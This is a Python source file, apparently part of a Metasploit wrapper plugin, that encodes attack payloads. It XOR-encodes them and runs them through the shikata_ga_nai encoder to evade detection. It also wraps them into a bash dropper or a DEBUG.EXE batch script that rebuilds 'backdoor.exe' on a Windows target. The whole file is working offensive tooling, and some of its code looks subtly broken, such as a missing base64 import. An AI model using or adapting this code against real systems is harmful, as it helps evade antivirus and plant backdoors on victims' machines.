# Copyright (c) 2010 Xavier Garcia  xavi.garcia@gmail.com 
# Copyright (c) 2009, Fast-Track
# The function toWinDebug() is an adapted version of the script
# bin/ftsrc/binarypayloadgen.py from Fast-Track 4.0
#
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of copyright holders nor the names of its
#    contributors may be used to endorse or promote products derived
#    from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
# TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
# PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.



from plugins.msf.pymetasploit.MetasploitObj import MsfObj
from subprocess import *
import re,binascii,os,sys,time,tempfile
from sys import exit, stdout

class MsfEncodeExecErr(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)



class MsfEncode(object):
	msfObj=None


	def __init__(self,msfObj):
		self.msfObj=msfObj

	def toBase64(self):
		self.msfObj.setPayload(base64.b64encode(self.msfObj.getPayload()))

	#encodes the payload using Xor and a key
	def toXor(self,key):
		kIdx = 0
		cryptStr = ""   # empty 'crypted string to be returned
		
		# loop through the string and XOR each byte with the keyword
		# to get the 'crypted byte. Add the 'crypted byte to the
		# 'crypted string
		for x in range(len(self.msfObj.getPayload())):
			cryptStr = cryptStr + \
				chr( ord(self.msfObj.getPayload()[x]) ^ ord(key[kIdx]))
			# use the mod operator - % - to cyclically loop through
			# the keyword
			kIdx = (kIdx + 1) % len(key)
		
		self.msfObj.setPayload(cryptStr)

	def toHex(self):
		self.msfObj.setPayload(binascii.hexlify(self.msfObj.getPayload()))

	def toShikataGaNai(self,times,arch):
		#msfencode -c 10 -a x86 -t exe -e x86/shikata_ga_nai
                msfencode=['msfencode','-c',str(times),'-a',str(arch),'-t','exe','-e','x86/shikata_ga_nai']
                process=Popen(msfencode,stdout=PIPE,stderr=PIPE,stdin=PIPE)
                stdOut, stdErr=process.communicate(self.msfObj.getPayload())

		msfEncodeNoEncSucceed="No encoders succeeded"
		if re.search(msfEncodeNoEncSucceed,stdOut,re.MULTILINE)!=None:
			raise MsfEncodeExecErr("Error trying to generate payload: "+self.msfObj.getRequestedPayload()+" "+' '.join(self.msfObj.getParams()))
		
		self.msfObj.setPayload(stdOut)


	# returns a shell script that sends a binary to stdout when executed
	# ./mysh.sh > backdoor
	def toBash(self):
		self.toHex()
		bashPayload="#! /bin/bash\n\n"
		bashPayload=bashPayload+"PAYLOAD=\"%s\"\n" % (self.msfObj.getPayload())
		bashPayload=bashPayload+"echo -n -e $( echo $PAYLOAD|tr -d '[:space:]' | sed 's/../\\\\x&/g') > /tmp/uploaded"
		self.msfObj.setPayload(bashPayload)

	def toWinDebug(self):
		try:
		   import psyco
		   psyco.full()
		except ImportError:
		   pass
		
		throwerror=300
		filesize = lambda x,n: stdout.write(x+'\n') or throwerror#(n)#exit(n)
		try:
		        fd, tmpPayload = tempfile.mkstemp(prefix="pymetasploit")        
		        os.close(fd)
		        fd=open(tmpPayload,'wb')
		        fd.write(self.msfObj.getPayload())
		        fd.close()


			fdout, temp_path = tempfile.mkstemp(prefix="pymetasploit")
			os.close(fdout)
			fileopen,writefile = open(tmpPayload,'rb'),open(temp_path, 'w')

		except:
			print "Something went wrong...."

		FOOTER  = ''.join(map(lambda x:"echo "+x+">>T\n",
		["RCX","%X ","N T.BIN","WDS:0","Q"])) 
		FOOTER += 'DEBUG<T 1>NUL\n'
		FOOTER += 'MOVE T.BIN backdoor.exe'
		FC,CX = 0, fileopen.seek(0,2) or fileopen.tell()
		if (CX > 0xFFFF): 
		  fileopen.close(); writefile.close()
		  filesize('[!] filesize exceeds 64kb, quitting.',1);
		fileopen.seek(0,0)
		writefile.write('DEL T 1>NUL 2>NUL\n')
		try:
		   for chunk in xrange(0x1000):
		     finalwrite = fileopen.read(16) or writefile.write(FOOTER%CX) or filesize("",0)
		     if finalwrite.count('\0')==0x10: FC += 1
		     else:
		       if FC > 0:
		         writefile.write('echo FDS:%X L %X 00>>T\n'%((chunk-FC)*0x10,FC*0x10))
		         FC = 0
		       writefile.write('echo EDS:%X '%(chunk*0x10))
		       writefile.write(' '.join(map(lambda x:"%02X"%ord(x),finalwrite))+'>>T\n')
		except Exception:
		       pass
		writefile.close()
		fd=open(temp_path,'r')
		self.msfObj.setPayload(fd.read())
		fd.close()
		os.remove(temp_path)
		os.remove(tmpPayload)
		
